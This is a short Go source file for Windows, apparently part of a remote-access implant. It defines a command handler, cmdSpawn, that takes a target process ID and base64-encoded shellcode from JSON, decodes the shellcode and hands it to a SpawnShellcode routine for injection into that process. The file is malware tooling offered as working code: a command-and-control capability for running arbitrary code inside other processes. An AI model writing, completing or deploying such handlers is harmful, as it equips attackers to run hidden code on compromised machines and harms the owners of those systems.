//go:build windows
// +build windows

package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
)

type SpawnParams struct {
	Pid       uint32 `json:"pid"`
	Shellcode string `json:"shellcode"`
}

func cmdSpawn(raw json.RawMessage) string {
	var p SpawnParams
	if err := json.Unmarshal(raw, &p); err != nil {
		return "error: " + err.Error()
	}

	sc, err := base64.StdEncoding.DecodeString(p.Shellcode)
	if err != nil {
		return "error: shellcode decode: " + err.Error()
	}

	result, err := SpawnShellcode(sc, p.Pid)
	if err != nil {
		return fmt.Sprintf("error: %s", err.Error())
	}

	return result
}
